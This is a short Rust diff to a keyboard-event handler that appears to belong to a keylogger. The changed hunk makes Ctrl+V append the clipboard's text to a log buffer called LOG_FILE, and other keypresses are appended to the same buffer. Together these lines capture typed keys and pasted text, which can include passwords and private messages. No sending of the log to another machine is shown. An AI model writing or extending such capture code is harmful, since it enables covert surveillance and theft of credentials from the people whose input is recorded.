@@ -213,13 +213,19 @@ fn track(event: Event) {
         EventType::KeyPress(key) => {
             let _key = event.name.unwrap();
 
-            if key == Key::KeyV && CTRL_HOLDED.lock().unwrap().clone() {
-                let mut clipboard = Clipboard::new().unwrap();
-                println!("Clipboard text was: {}", clipboard.get_text().unwrap());
+            if CTRL_HOLDED.lock().unwrap().clone() {
+                match key {
+                    Key::KeyV => {
+                        let mut clipboard = Clipboard::new().unwrap();
+                        *LOG_FILE.lock().unwrap() += &clipboard.get_text().unwrap();
+                        // let the_string = "Hello, world!";
+                        // clipboard.set_text(the_string).unwrap();
+                        // println!("But now the clipboard text should be: \"{}\"", the_string);
+                    },
+                    _ => {
 
-                // let the_string = "Hello, world!";
-                // clipboard.set_text(the_string).unwrap();
-                // println!("But now the clipboard text should be: \"{}\"", the_string);
+                    }
+                }
             } else {
                 *LOG_FILE.lock().unwrap() += &_key;
                 *LOGGED.lock().unwrap() = false;
